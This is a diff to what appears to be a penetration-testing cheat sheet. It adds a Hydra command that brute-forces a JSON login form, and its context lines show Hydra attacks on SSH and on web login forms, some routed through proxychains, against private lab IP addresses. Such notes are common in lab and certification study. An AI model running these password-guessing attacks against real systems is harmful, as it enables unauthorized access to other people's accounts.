@@ -23,6 +23,9 @@ hydra -L usernamelist -p password  192.168.50.214 -t 4 ssh    #Brute force ssh u
 hydra -L /home/kali/tmp/users.txt -P /home/kali/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt -f -V 192.168.212.195 -s 8080 http-post-form "/login.php:username=^USER^&password=^PASS^:Bad Password"
 proxychains hydra -L /home/kali/tmp/users.txt -P /home/kali/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt -f -V 192.168.212.195 http-post-form "/login.php:username=^USER^&password=^PASS^:S=Logged In" -I -V
 
+#Hydra http-post-form with JSON body(-s flag if app is on a non standard port)
+hydra -l admin -P /home/kali/wordlists/rockyou.txt -f -V 192.168.112.181 -s 9090 http-post-form "/login:{\"user\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:Invalid username or password"
+
 #Hashcat
 #Supported attack modes
 #Brute-Force attack (-a 3)##Combinator attack (-a 1)#Dictionary attack (-a 0)
